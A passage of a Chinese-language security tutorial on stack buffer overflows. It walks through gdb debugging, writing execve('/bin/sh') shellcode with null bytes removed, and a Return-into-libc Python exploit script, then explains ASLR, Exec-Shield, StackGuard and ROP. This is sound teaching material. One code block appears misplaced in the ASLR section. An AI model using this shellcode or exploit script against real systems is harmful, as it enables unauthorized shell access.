(gdb) b *0x080485be
Breakpoint 1 at 0x80485be
(gdb) b cpy
Breakpoint 2 at 0x8048546
(gdb) r "\`python -c 'print "A"*80'\`"
Starting program: /usr/home/guest/sample3 "\`python -c 'print "A"*80'\`"
(no debugging symbols found)...(no debugging symbols found)...
Breakpoint 2, 0x08048546 in cpy ()
(gdb) x/8x $ebp
0xbfbfebf8: 0xbfbfec08 0x080485e1 0xbfbfedb0 0xbfbfec20
0xbfbfec08: 0xbfbfec38 0x080484b7 0x00000000 0x00000000
(gdb) x/1s 0xbfbfedb0
0xbfbfedb0: ""
(gdb) x/1s 0xbfbfedb0
0xbfbfedb0: 'A' &lt;repeats 80 times&gt;
(gdb) c 
Continuing.
0xbfbfebb8
Breakpoint 1, 0x080485be in cpy ()
(gdb) x/8x $esp
0xbfbfebfc: 0x41414141 0x41414141 0x41414141 0xbfbfec00
0xbfbfec0c: 0x080484b7 0x00000000 0x00000000 0xbfbfec38
(gdb) si
0x41414141 in ?? ()
(gdb)</pre>
<p><span class="md-line md-end-block"><img class="alignnone size-full wp-image-99887 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/QQ截图.png" alt=".QQ截图" width="734" height="663" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/QQ截图.png 734w, http://www.mottoin.com/wp-content/uploads/2017/04/QQ截图-300x271.png 300w" sizes="(max-width: 734px) 100vw, 734px" /></span></p>
<p><span class="md-line md-end-block">要点在于：</span></p>
<ul class="ul-list" data-mark="*">
<li><span class="md-line md-end-block">0xbfbfebf8的值为%ebp</span></li>
<li><span class="md-line md-end-block">0xbfbfebfc的值为ret_addr</span></li>
<li><span class="md-line md-end-block">后面是传递给函数的参数</span></li>
</ul>
<p><span class="md-line md-end-block">sample3的cpy函数只有一个str函数，因此位置紧挨着ret_addr</span></p>
<p><img class="alignnone size-full wp-image-99888 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489134017439.png" alt=".1489134017439" width="1184" height="246" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489134017439.png 1184w, http://www.mottoin.com/wp-content/uploads/2017/04/1489134017439-300x62.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1489134017439-768x160.png 768w, http://www.mottoin.com/wp-content/uploads/2017/04/1489134017439-1024x213.png 1024w" sizes="(max-width: 1184px) 100vw, 1184px" /></p>
<p><span class="md-line md-end-block">此处，由于cpy中的定义buff变量溢出，因此后面的内存空间都会全部被覆盖。</span><span class="md-line md-end-block">0xbfbfebfc的值被改写成0x41414141，因此当程序运行到0x080485be的指令时，就会跳到0x41414141这个地址，导致Segmentation falut。若在buff中植入一些机器语言指令，然后将返回地址改为这些指令的地址，这样就可以让计算机执行任意代码。</span></p>
<h4 class="md-end-block md-heading">攻击代码示例</h4>
<p><span class="md-line md-end-block">攻击者要执行的代码叫shellcode，一般地，只要启动了<span spellcheck="false"><code>/bin/sh</code></span>，攻击者就能够完全控制计算机，因此shellcode指的就是一段非常短小的机器语言代码，它的功能就是<span spellcheck="false"><code>/bin/sh</code></span></span></p>
<p><span class="md-line md-end-block">例子：</span></p>
<pre>#include &lt;unistd.h&gt;

int main(void)
{
 char *data[2];
 char sh[] = "/bin/sh";

data[0] = sh;
 data[1] = NULL;

execve(sh, data, NULL);
 return 0;
}</pre>
<blockquote><p><span class="md-line md-end-block">先声明一个char型的指针型数组，然后在data[0]中存入<span spellcheck="false"><code>/bin/sh</code></span>字符串的指针，在data[1]中存入了NULL。由于<span spellcheck="false"><code>/bin/sh</code></span>不需要参数，因此data数组只需要两个元素就够。</span></p></blockquote>
<p><span class="md-line md-end-block"><span spellcheck="false"><code>execv</code></span>的参数为下列3个：</span></p>
<ul class="ul-list" data-mark="*">
<li><span class="md-line md-end-block">/bin/sh字符串的指针</span></li>
<li><span class="md-line md-end-block">包含传递给程序的参数在内的数组的地址</span></li>
<li><span class="md-line md-end-block">环境变量</span></li>
</ul>
<blockquote><p><span class="md-line md-end-block">此处环境变量不是必须的，因此将其设为NULL。</span></p>
<p><span class="md-line md-end-block"><span spellcheck="false"><code>/bin/sh</code></span>不需要参数，因此data指存放了<span spellcheck="false"><code>/bin/sh</code></span>字符串的指针</span></p></blockquote>
<p><img class="alignnone size-full wp-image-99889 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489134779288.png" alt=".1489134779288" width="497" height="188" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489134779288.png 497w, http://www.mottoin.com/wp-content/uploads/2017/04/1489134779288-300x113.png 300w" sizes="(max-width: 497px) 100vw, 497px" /></p>
<p><span class="md-line md-end-block">由于sample5是采用静态链接编译的，因此execve本身也位于可执行文件内部。用gdb对execve进行反汇编，可以发现其中调用了int $0x80</span></p>
<p><img class="alignnone size-full wp-image-99890 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489134947140.png" alt=".1489134947140" width="725" height="343" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489134947140.png 725w, http://www.mottoin.com/wp-content/uploads/2017/04/1489134947140-300x142.png 300w" sizes="(max-width: 725px) 100vw, 725px" /></p>
<p><span class="md-line md-end-block">int $0x80是一个系统调用。</span></p>
<p><span class="md-line md-end-block">前面的<span spellcheck="false"><code>mov $0x3b,%eax</code></span>指令，它的功能是将0x3b存入eax寄存器。实际上，这个值是execve系统调用的编号，系统内核会根据这个编号来识别不同的系统调用。</span></p>
<p><span class="md-line md-end-block">系统调用编号(usr/include/sys/syscall.h)：</span></p>
<p><img class="alignnone size-full wp-image-99891 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489135179351.png" alt=".1489135179351" width="514" height="400" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489135179351.png 514w, http://www.mottoin.com/wp-content/uploads/2017/04/1489135179351-300x233.png 300w" sizes="(max-width: 514px) 100vw, 514px" /></p>
<p><span class="md-line md-end-block">系统调用的编号:</span></p>
<ul class="ul-list" data-mark="*">
<li><span class="md-line md-end-block">1:exit</span></li>
<li><span class="md-line md-end-block">2:fork</span></li>
<li><span class="md-line md-end-block">3:read</span></li>
<li><span class="md-line md-end-block">4:write</span></li>
</ul>
<p><span class="md-line md-end-block">以此类推，59号对应execve，将59转换为十六进制就是0x3b</span></p>
<p><span class="md-line md-end-block">Linux系统中，execve的编号为11。由于系统调用的编号在每个环境中不同，因此在制作shellcode的时候，需要注意。</span></p>
<h4 class="md-end-block md-heading">生成可用作shellcode的机器语言代码</h4>
<p><img class="alignnone size-full wp-image-99892 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/shellcode.png" alt=".shellcode" width="759" height="927" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/shellcode.png 759w, http://www.mottoin.com/wp-content/uploads/2017/04/shellcode-246x300.png 246w" sizes="(max-width: 759px) 100vw, 759px" /></p>
<p><span class="md-line md-end-block">在调用execve的地方设置断点，确认此时内存状态。</span></p>
<p><img class="alignnone size-full wp-image-99893 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489141752365.png" alt=".1489141752365" width="1168" height="532" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489141752365.png 1168w, http://www.mottoin.com/wp-content/uploads/2017/04/1489141752365-300x137.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1489141752365-768x350.png 768w, http://www.mottoin.com/wp-content/uploads/2017/04/1489141752365-1024x466.png 1024w" sizes="(max-width: 1168px) 100vw, 1168px" /></p>
<p><span class="md-line md-end-block">execve需三个参数，分别为：</span></p>
<ul class="ul-list" data-mark="*">
<li><span class="md-line md-end-block">第一参数:0xbfbfebb4(/bin/sh地址)</span></li>
<li><span class="md-line md-end-block">第二参数:0xbfbfebbc(/bin/sh的地址以及内容为NULL的数组)</span></li>
<li><span class="md-line md-end-block">第三参数:0x00000000(NULL)</span></li>
</ul>
<p><span class="md-line md-end-block">已经将sample5.c所设计的样子将数据排列好。</span><span class="md-line md-end-block">0xbfbfebac和0xbfbfebb0与execv的调用无关，因此可以将它们删除掉，于是得到一段最低限度的内存配置</span></p>
<p><img class="alignnone size-full wp-image-99894 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489142170085.png" alt=".1489142170085" width="1146" height="292" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489142170085.png 1146w, http://www.mottoin.com/wp-content/uploads/2017/04/1489142170085-300x76.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1489142170085-768x196.png 768w, http://www.mottoin.com/wp-content/uploads/2017/04/1489142170085-1024x261.png 1024w" sizes="(max-width: 1146px) 100vw, 1146px" /></p>
<p><span class="md-line md-end-block">编写汇编代码，将上述数据写入栈当前esp以后的位置，并调用execve。</span></p>
<pre>.globl main
main:
 xorl %eax, %eax
 pushl %eax ;data[1](NULL)
 movl %esp, %eax
 subl $0x0c,%eax
 pushl %eax ;data[0](/bin/sh地址)
 movl %esp, %ebx
 pushl $0x0068732f ;字符串"/sh\0"
 pushl $0x6e69622f ;字符串"/bin"
 movl %esp, %edx
 xorl %eax, %eax
 pushl %eax ;第三参数
 pushl %ebx ;第二参数
 pushl %edx ;第一参数
 pushl %eax ;call的返回地址(可以为任意值)
 movb $0x3b, %al
 int $0x80</pre>
<p><span class="md-line md-end-block">使用objdump将上面的代码转换为 机器语言。</span></p>
<p><img class="alignnone size-full wp-image-99895 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489142909808.png" alt=".1489142909808" width="733" height="841" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489142909808.png 733w, http://www.mottoin.com/wp-content/uploads/2017/04/1489142909808-261x300.png 261w" sizes="(max-width: 733px) 100vw, 733px" /></p>
<p><span class="md-line md-end-block">将机器码编译成可执行文件</span></p>
<p><img class="alignnone size-full wp-image-99896 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489143141775.png" alt=".1489143141775" width="301" height="231" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489143141775.png 301w, http://www.mottoin.com/wp-content/uploads/2017/04/1489143141775-300x230.png 300w" sizes="(max-width: 301px) 100vw, 301px" /></p>
<p><span class="md-line md-end-block">shellcode执行成功。</span></p>
<blockquote><p><span class="md-line md-end-block">只要将这段机器码嵌入目标程序，并设法让其执行，就能够夺取系统的控制权</span></p></blockquote>
<h4 class="md-end-block md-heading">对0x00的改进</h4>
<p><span class="md-line md-end-block">上面的shellcode还无法对sample3进行攻击，因为里面出现了0x00。在sample3中，复制数据时使用了strcpy函数，这个函数会用0x00来判断字符串的结尾。因此，当shellcode中间出现0x00时，strcpy就无法完整地复制shellcode地数据。</span></p>
<p><span class="md-line md-end-block">在sample6中，在对字符串/sh\0进行push地地方出现了0x00。</span></p>
<pre>804840f: 68 2f 73 68 00 push $0x68732f
8048414: 68 2f 62 69 6e push $0x6e69622f</pre>
<p><span class="md-line md-end-block">解决该问题可以采用下面办法：</span></p>
<ul class="ul-list" data-mark="*">
<li><span class="md-line md-end-block">将/bin/sh改为/bin//sh以凑齐8个字节</span></li>
<li><span class="md-line md-end-block">在前面先push $0</span></li>
</ul>
<blockquote><p><span class="md-line md-end-block">尽管多一个斜杠，但该命令运行不会有问题。因此，将<span spellcheck="false"><code>/sh\0</code></span>改为<span spellcheck="false"><code>//sh</code></span>，这样就成功消除了push里的<span spellcheck="false"><code>0x00</code></span></span></p></blockquote>
<p><span class="md-line md-end-block">用xor和push相互结合的方法，向栈中放入一个0x00作为字符串结尾的标志，这样就能避免整段代码出现<span spellcheck="false"><code>0x00</code></span></span></p>
<pre>.globl main
main:
 xorl %eax, %eax
 pushl %eax
 movl %esp, %eax
 subl $0x10, %eax
 pushl %eax 
 movl %esp, %ebx 
 xorl %eax, %eax 
 pushl %eax ;push 0x00000000
 pushl $0x68732f2f ;push字符串"//sh"
 pushl $0x6e69622f ;push字符串"/bin"
 movl %esp, %edx
 xorl %eax, %eax
 pushl %eax
 pushl %ebx
 pushl %edx
 pushl %eax
 movb $0x3b, %al
 int $0x80</pre>
<p><img class="alignnone size-full wp-image-99897 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489144383415.png" alt=".1489144383415" width="666" height="389" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489144383415.png 666w, http://www.mottoin.com/wp-content/uploads/2017/04/1489144383415-300x175.png 300w" sizes="(max-width: 666px) 100vw, 666px" /></p>
<p><span class="md-line md-end-block">sample9.c的代码：</span></p>
<pre>unsigned char shellcode[] = {
 0x31, 0xc0, // xor %eax, %eax
 0x50, // push %eax
 0x89, 0xe0, // mov %esp, %eax
 0x83, 0xe8, 0x10, // sub $0x10, %eax
 0x50, // push %eax
 0x89, 0xe3, // mov %esp, %ebx
 0x31, 0xc0, // xor %eax, %eax
 0x50, // push %eax
 0x68, 0x2f, 0x2f, 0x73, 0x68, // push $0x68732f2f
 0x68, 0x2f, 0x62, 0x69, 0x6e, // push $0x6e69622f
 0x89, 0xe2, // mov %esp, %edx
 0x31, 0xc0, // xor %eax, %eax
 0x50, // push %eax
 0x53, // push %ebx
 0x52, // push %edx
 0x50, // push %eax
 0xb0, 0x3b, // mov $0x3b, %al
 0xcd, 0x80, // int $0x80
};

int main(void)
{
 void (*p)(void);
 p = (void(*)())shellcode;
 p();
 return 0;
}</pre>
<p><img class="alignnone size-full wp-image-99898 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489145641910.png" alt=".1489145641910" width="366" height="192" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489145641910.png 366w, http://www.mottoin.com/wp-content/uploads/2017/04/1489145641910-300x157.png 300w" sizes="(max-width: 366px) 100vw, 366px" /></p>
<p><span class="md-line md-end-block">shellcode完成，可在<span spellcheck="false"><code>exploit.py</code></span>使用</span></p>
<p><span class="md-line md-end-block">将这段代码插入到sample3的内存空间，然后将返回地址改为shellcode的起始地址，就可以夺取系统权限。</span></p>
<p><img class="alignnone size-full wp-image-99899 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/0310210948.png" alt=".0310210948" width="670" height="580" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/0310210948.png 670w, http://www.mottoin.com/wp-content/uploads/2017/04/0310210948-300x260.png 300w" sizes="(max-width: 670px) 100vw, 670px" /></p>
<p><span class="md-line md-end-block">函数的返回目标地址已经变成shellcode。</span></p>
<p><span class="md-line md-end-block">sample3.c在运行时候显示shellcode的地址，纯属演示效果。实际中，并不知道shellcode位于目标进程的哪个地址，只能推测。</span></p>
<p><span class="md-line md-end-block">不过栈的位置是可以推算出来的，因此可以尽量在内存中填充NOP(0x90)指令，然后将shellcode放在最后，这样可提高shellcode被执行概率。</span></p>
<p><span class="md-line md-end-block">此次使用的是strcpy函数，因此只要去除0x00就可以，但有些软件会对字符串有更多的限制，例如只接受英文字母。为了应付该情况，业界曾对用只用特定字符集编写shellcode进行了大量研究。</span></p>
<p><span class="md-line md-end-block"><span class=""><strong>近年由于操作系统默认启用了一些安全机制，传统的缓冲区溢出攻击已经不管用</strong></span></span></p>
<blockquote><p><span class="md-line md-end-block"><span spellcheck="false"><code>printf</code></span>类函数的字符串格式化bug也是具有代表性的漏洞。</span></p></blockquote>
<pre>#include &lt;stdio.h&gt;
void main(int argc, char *argv[])
{
 printf(argv[1]);</pre>
<blockquote><p><span class="md-line md-end-block">printf类函数中，有一个特殊的格式转换符%n,它可以向参数中指针所指的位置写入当前已输出的数据长度。利用%n，可以向任意地址写入任意值。和缓冲区溢出相比，该漏洞没那么严重。</span></p></blockquote>
<h3 class="md-end-block md-heading">防御攻击的技术</h3>
<h4 class="md-end-block md-heading">地址随机化:ASLR</h4>
<p><span class="md-line md-end-block">ASLR(Address Space Layout Randomization)是一种对栈、模块、动态分配的内存空间等的地址(位置)进行随机分配的机制。</span></p>
<p><span class="md-line md-end-block">ASLR属于操作系统功能，例如Ubuntu12.04中，可通过<span spellcheck="false"><code>/proc/sys/kernel/randomize_va_space</code></span>来查看和修改该设置。</span></p>
<p><span class="md-line md-end-block">切换到root用户，运行：</span></p>
<pre>#include &lt;stdio.h&gt;
void main(int argc, char *argv[])
{
 printf(argv[1]);</pre>
<p><span class="md-line md-end-block">用cat命令查看<span spellcheck="false"><code>randomize_va_space</code></span>的值，输出的结果可能是0、1或者2.</span></p>
<ul class="ul-list" data-mark="*">
<li><span class="md-line md-end-block">0：禁用</span></li>
<li><span class="md-line md-end-block">1：除堆以外随机化</span></li>
<li><span class="md-line md-end-block">2：全部随机化（默认）</span></li>
</ul>
<p><span class="md-line md-end-block">通过以下程序确认ASLR的效果，该程序很简单，它会显示出用<span spellcheck="false"><code>malloc</code></span>分配的内存空间地址以及栈的地址。</span></p>
<pre>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
unsigned long get_sp(void)
{
 __asm__("movl %esp, %eax");
}
int main(void)
{
 printf("malloc: %p\n", malloc(16));
 printf(" stack: 0x%lx\n", get_sp());
 return 0;
}</pre>
<p><span class="md-line md-end-block">在启用ASLR的状态下，反复运行该程序，会发现程序地址不同。</span></p>
<p><img class="alignnone size-full wp-image-99900 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489156288416.png" alt=".1489156288416" width="456" height="236" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489156288416.png 456w, http://www.mottoin.com/wp-content/uploads/2017/04/1489156288416-300x155.png 300w" sizes="(max-width: 456px) 100vw, 456px" /></p>
<p>&nbsp;</p>
<p><span class="md-line md-end-block">如果地址布局无法推测出来，也就无法知道shellcode的具体地址。</span></p>
<p><span class="md-line md-end-block">同样的程序，若在禁用ASLR的状态下运行，则差异很大。</span></p>
<p><img class="alignnone size-full wp-image-99901 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489156557490.png" alt=".1489156557490" width="634" height="269" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489156557490.png 634w, http://www.mottoin.com/wp-content/uploads/2017/04/1489156557490-300x127.png 300w" sizes="(max-width: 634px) 100vw, 634px" /></p>
<blockquote><p><span class="md-line md-end-block">关闭ASLR之后，无论运行多少次，显示出的地址都完全相同。</span></p></blockquote>
<p><span class="md-line md-end-block">演示程序test01，该程序具备缓冲区溢出漏洞，它会用<span spellcheck="false"><code>strcpy</code></span>复制命令行参数中输入的字符串。</span></p>
<p><img class="alignnone size-full wp-image-99902 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489157112086.png" alt=".1489157112086" width="656" height="263" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489157112086.png 656w, http://www.mottoin.com/wp-content/uploads/2017/04/1489157112086-300x120.png 300w" sizes="(max-width: 656px) 100vw, 656px" /></p>
<p><span class="md-line md-end-block">当启用ASLR时，test01所显示的地址每次都不同，因此无法将正确的地址传递给exploit.py，也就无法成功获取系统权限。</span></p>
<h4 class="md-end-block md-heading">Exec-Shield</h4>
<p><span class="md-line md-end-block">除存放可执行代码的内存空间以外，对其余内存空间尽量禁用执行权限：Exec-Shield</span></p>
<p><span class="md-line md-end-block">Exec-Shield是一种通过“限制内存空间的读写和执行权限”来防御攻击的机制。</span></p>
<p><span class="md-line md-end-block">通常情况下，不会在用作栈的内存空间里存放可执行的机器代码，因此可以将栈空间的权限设为可读写但不可执行。反过来，在代码区域中存放的机器语言代码，通常也不需要在运行时进行改写，因此可以将这部分内存的权限设置为不可写入。这样，即便将shellcode复制到栈中，若这些代码无法执行，就会产生Segmentation fault，导致程序停止运行。</span></p>
<p><span class="md-line md-end-block">要在系统中查看某个程序进程内存空间的读写和执行权限，在程序运行时输出<span spellcheck="false"><code>/proc/&lt;PID&gt;maps</code></span>就行</span></p>
<pre>root@ubuntu:/home/guest# ps -aef | grep test02
root 8047 8033 0 06:59 pts/0 00:00:00 grep --color=auto test02
root@ubuntu:/home/guest# cat /proc/8033/maps | grep stack
bfaec000-bfb0d000 rw-p 00000000 00:00 0 [stack]</pre>
<p><span class="md-line md-end-block">test02是test01加上Exec-Shield之后的版本，其中栈空间为<span spellcheck="false"><code>bfdcc00~bfded000</code></span>,它的权限是rw-p，没有代表执行权限的x.</span></p>
<p><span class="md-line md-end-block">测试Exec-Shield的效果：</span></p>
<pre>guest@ubuntu:~$ ./test02 `python exploit.py "bffff710"` aaaabbbbccccdddd
0xbfded260
Segmentation fault</pre>
<p><span class="md-line md-end-block">尽管输入的地址和输出的地址一样，但攻击还是失败了。</span></p>
<p><span class="md-line md-end-block"><span class=""><strong>ASLR的思路是防止攻击者猜中地址，而Exec-Shield则是在地址一致的情况下，攻击者也无法执行其中的机器语言代码</strong></span></span></p>
<blockquote><p><span class="md-line md-end-block">查看test01的<span spellcheck="false"><code>/proc/&lt;PID&gt;/maps</code></span>，就会发现其栈空间也带有执行权限。这也是test01和test02的区别。</span></p></blockquote>
<h4 class="md-end-block md-heading">StackGuard</h4>
<p><span class="md-line md-end-block"><span class=""><strong><span spellcheck="false"><code>StackGuard</code></span>是一种在编译时在各函数入口和出口插入用于检测栈数据完整性的机器语言代码的方法，它属于编译器的安全机制</strong></span></span></p>
<p><span class="md-line md-end-block">例子：</span></p>
<p><img class="alignnone size-full wp-image-99903 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489158826264.png" alt=".1489158826264" width="730" height="623" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489158826264.png 730w, http://www.mottoin.com/wp-content/uploads/2017/04/1489158826264-300x256.png 300w" sizes="(max-width: 730px) 100vw, 730px" /></p>
<p><span class="md-line md-end-block">在启用ASLR或Exec-Shield时，上述程序会产生Segmentation fault，但StackGuard则是让test03检测自身的异常，并主动停止运行。</span></p>
<p><span class="md-line md-end-block">test03具有栈缓冲区溢出的漏洞，当栈内数据发生溢出时，StackGuard代码能够检测这异常情况，并显示stack smashing detected消息，强制终止程序运行。</span></p>
<p><span class="md-line md-end-block">查看test03.s的代码，就能找到添加StackGuard的代码。</span></p>
<p><img class="alignnone size-full wp-image-99904 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/0310231832.png" alt=".0310231832" width="579" height="621" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/0310231832.png 579w, http://www.mottoin.com/wp-content/uploads/2017/04/0310231832-280x300.png 280w" sizes="(max-width: 579px) 100vw, 579px" /></p>
<blockquote><p><span class="md-line md-end-block">%gs:20在每次程序运行时，都会存入一个随机数，将该随机数复制到函数所使用的栈空间的最后。由于60(%esp)后面就是ebp和ret_addr，因此这样的配置可以保护关键地址的数据不被篡改。</span></p></blockquote>
<blockquote><p><span class="md-line md-end-block">当函数即将返回之前，程序将%gs:20的值与60(%esp)进行比对。若由于某些原因导致溢出，ebp和ret_addr被覆盖，那么60(%esp)的值也会被同时覆盖。当检测到溢出时，程序将跳转到__stack_chk_fail，并终止运行。</span></p></blockquote>
<p><span class="md-line md-end-block">总之，StackGuard机制所保护的是ebp和ret_addr，是一种针对典型栈缓冲区溢出攻击的防御手段。</span></p>
<p><span class="md-line md-end-block">注：ubuntu12.04的gcc中，在编译时默认加上StackGuard代码，要禁用StackGuard需加上-fbo-stack-protector选项</span></p>
<h3 class="md-end-block md-heading">绕开安全机制</h3>
<h4 class="md-end-block md-heading">Return-into-libc</h4>
<p><span class="md-line md-end-block">Return-into-libc是一种破解Exec-Shield的方法，思路是&#8221;即便无法执行任意代码(shellcode)，最终只要能运行任意程序也能获得系统权限&#8221;</span></p>
<p><span class="md-line md-end-block"><span class=""><strong>Return-into-libc的基本原理是通过调整参数和栈的配置，使得程序能够跳转到libc.so中的system函数以及exec类函数，借此运行<span spellcheck="false"><code>/bin/sh</code></span>等程序</strong></span></span></p>
<p><span class="md-line md-end-block">使用<span spellcheck="false"><code>ldd</code></span>命令查看程序在运行时所加载的库。</span></p>
<p><img class="alignnone size-full wp-image-99905 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489160105208.png" alt=".1489160105208" width="705" height="272" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489160105208.png 705w, http://www.mottoin.com/wp-content/uploads/2017/04/1489160105208-300x116.png 300w" sizes="(max-width: 705px) 100vw, 705px" /></p>
<p><span class="md-line md-end-block">几乎所有的程序在运行时都会加载<span spellcheck="false"><code>libc.so</code></span>，或者是在编译时进行静态链接。因此只要能够调用libc中的system函数和exec类函数，就能够夺取系统权限。</span></p>
<p><span class="md-line md-end-block">例子（关闭ASLR实验）</span></p>
<p><img class="alignnone size-full wp-image-99906 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489160347008.png" alt=".1489160347008" width="752" height="473" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489160347008.png 752w, http://www.mottoin.com/wp-content/uploads/2017/04/1489160347008-300x189.png 300w" sizes="(max-width: 752px) 100vw, 752px" /></p>
<p><span class="md-line md-end-block">得到system和exit的地址。</span><span class="md-line md-end-block">这次就不需要将返回地址改成位于栈中的shellcode地址，而是改成system函数的入口地址，将system函数的返回目标设为exit，并将<span spellcheck="false"><code>/bin/sh</code></span>的地址作为参数传递过去。</span></p>
<pre>#!/usr/bin/python

import sys
from struct import *

if len(sys.argv) != 2:
 addr = 0x41414141
else:
 addr = int(sys.argv[1], 16) + 0x08

fsystem = int("b7e6c430", 16)
fexit = int("b7e5ffb0", 16)

data = "\x90\x90\x90\x90\x90\x90\x90\x90"
data += "\x90\x90\x90\x90\x90\x90\x90\x90"
data += "\x90\x90\x90\x90\x90\x90\x90\x90"
data += "\x90\x90\x90\x90\x90\x90\x90\x90"
data += pack('&lt;L', fsystem)
data += pack('&lt;L', fexit)
data += pack('&lt;L', addr)
data += "/bin/sh"

sys.stdout.write(data)</pre>
<p><span class="md-line md-end-block">演示结果：</span></p>
<p><img class="alignnone size-full wp-image-99908 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489160621005.png" alt=".1489160621005" width="537" height="110" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489160621005.png 537w, http://www.mottoin.com/wp-content/uploads/2017/04/1489160621005-300x61.png 300w" sizes="(max-width: 537px) 100vw, 537px" /></p>
<blockquote><p><span class="md-line md-end-block">test02已开启Exec-Shield机制，但还是绕过了它并取得成功夺取的权限，这是一个简单的Return-into-libc的例子。但还是需要没有ASLR或者StackGuard防护机制才能攻击成功</span></p></blockquote>
<p><span class="md-line md-end-block">在此例中，使用了system函数代替了shellcode。</span></p>
<h4 class="md-end-block md-heading">ROP</h4>
<p><span class="md-line md-end-block">Return-into-libc是利用库函数(libc)来代替shellcode发动攻击的方法。然而ASLR将加载的模块全部随机化，攻击也会因为无法获得准确的模块地址(不知道system和exec的地址)而失败。</span></p>
<p><span class="md-line md-end-block"><span class=""><strong>ROP(Return-Oriented-Programming)，面向返回编程。这种攻击来源于利用随机化的那些模块内部汇编代码拼接所需程序逻辑进行攻击的思路</strong></span></span></p>
<p><span class="md-line md-end-block">ROP 是一种高级的堆栈溢出攻击。这类攻击往往利用操作堆栈调用时的程序漏洞，通常是缓冲区溢出。在缓冲区溢出中，在将数据存入内存前未能正确检查适当范围的函数会收到多于正常承受范围的数据，如果数据将写入堆栈，多余的数据会溢出为函数变量分配的空间并覆盖替换 return 地址。在原本用以重定向控制流并返回给调用者的地址被覆盖替换后，控制流将改写到新分配的地址</span></p>
<p><span class="md-line md-end-block">ROP相关资料:</span></p>
<ul class="ul-list" data-mark="-">
<li><span class="md-line md-end-block"><span class=""><a spellcheck="false" href="https://www.ibm.com/developerworks/cn/linux/1402_liumei_rilattack/">Return-into-libc 攻击及其防御</a></span></span></li>
<li><span class="md-line md-end-block"><span class=""><a spellcheck="false" href="http://mudongliang.github.io/2016/08/04/intel-release-new-technology-specifications-to-protect-against-rop-attacks-zh.html">因特尔发布新的技术规范去防御 ROP 攻击</a></span></span></li>
